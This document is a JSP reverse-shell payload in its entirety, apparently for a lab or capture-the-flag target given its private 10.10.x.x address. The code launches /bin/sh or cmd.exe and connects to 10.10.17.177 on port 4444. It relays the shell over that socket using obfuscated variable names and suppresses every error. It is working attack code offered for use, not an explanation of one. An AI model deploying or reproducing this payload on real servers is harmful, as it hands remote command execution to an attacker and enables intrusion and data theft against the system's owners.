<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream xa;
    OutputStream ck;

    StreamConnector( InputStream xa, OutputStream ck )
    {
      this.xa = xa;
      this.ck = ck;
    }

    public void run()
    {
      BufferedReader aa  = null;
      BufferedWriter qgp = null;
      try
      {
        aa  = new BufferedReader( new InputStreamReader( this.xa ) );
        qgp = new BufferedWriter( new OutputStreamWriter( this.ck ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = aa.read( buffer, 0, buffer.length ) ) > 0 )
        {
          qgp.write( buffer, 0, length );
          qgp.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( aa != null )
          aa.close();
        if( qgp != null )
          qgp.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.17.177", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
